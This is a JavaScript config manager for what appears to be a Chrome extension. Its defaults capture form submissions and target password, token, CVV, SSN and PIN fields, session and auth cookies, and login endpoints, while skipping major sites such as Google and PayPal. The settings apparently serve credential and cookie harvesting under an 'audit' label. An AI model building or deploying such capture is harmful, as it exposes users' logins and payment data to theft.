// Configuration Manager - Minimal Config
class ConfigManager {
    static DEFAULTS = {
        SERVER_URL: "http://localhost:8000/v1/audit",
        ENABLED: true,
        MAX_RETRIES: 3,
        RETRY_DELAY: 1000,
        RATE_LIMIT_WINDOW: 1000,
        MAX_REQUESTS_PER_WINDOW: 10,
        DUPLICATE_WINDOW: 5000,
        QUEUE_BUFFER_SIZE: 50,
        QUEUE_FLUSH_TIMEOUT: 5000,
        QUEUE_MAX_SIZE: 5000,
        QUEUE_MAX_AGE_DAYS: 7,
        ENABLE_QUOTA_CHECK: true,
        LOG_LEVEL: 'INFO',

        CAPTURE_TECHNIQUES: {
            FORM_SUBMIT: true
        },

        CAPTURE_RULES: {
            SENSITIVE_FIELD_PATTERNS: [
                'pass', 'pwd', 'password', 'passwd',
                'email', 'user', 'username', 'login', 'account', 'uid', 'uname',
                'token', 'auth', 'api_key', 'apikey',
                'secret', 'credential', 'session',
                'otp', 'pin', 'cvv', 'ssn'
            ],
            SENSITIVE_COOKIE_PATTERNS: [
                'session', 'sess', 'sid', 'auth', 'token',
                'jwt', 'csrf', 'xsrf', 'login', 'user'
            ],
            TARGET_DOMAINS: [],
            EXCLUDED_DOMAINS: [
                'google.com', 'facebook.com', 'twitter.com',
                'youtube.com', 'linkedin.com', 'instagram.com',
                'amazon.com', 'ebay.com', 'paypal.com'
            ],
            NOISE_PATTERNS: [
                'google-analytics', 'doubleclick', 'googletagmanager',
                'facebook.com/tr', 'clarity.ms', 'hotjar',
                '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico',
                '.css', '.js', '.woff', '.ttf', '.eot',
                'favicon', 'manifest.json'
            ],
            CAPTURE_ONLY_IMPORTANT: true,
            AUTH_ENDPOINT_PATTERNS: [
                'login', 'signin', 'sign-in', 'log-in', 'log_in', 'sign_in',
                'auth', 'authenticate', 'authentication', 'logon',
                'session', 'oauth', 'token', 'register', 'signup', 'sign-up',
                'credential', 'password', 'verify', 'recover', 'reset-password'
            ]
        }
    };

    static async load() {
        return new Promise((resolve) => {
            chrome.storage.sync.get(this.DEFAULTS, (config) => {
                const merged = JSON.parse(JSON.stringify(this.DEFAULTS));
                Object.assign(merged, config);
                if (merged.CAPTURE_RULES && this.DEFAULTS.CAPTURE_RULES) {
                    merged.CAPTURE_RULES = { ...this.DEFAULTS.CAPTURE_RULES, ...merged.CAPTURE_RULES };
                }
                resolve(merged);
            });
        });
    }

    static async save(updates) {
        return new Promise((resolve) => {
            chrome.storage.sync.set(updates, () => {
                resolve();
            });
        });
    }

    static async update(key, value) {
        const config = await this.load();
        config[key] = value;
        await this.save(config);
        return config;
    }

    static async reset() {
        return this.save(this.DEFAULTS);
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = ConfigManager;
}
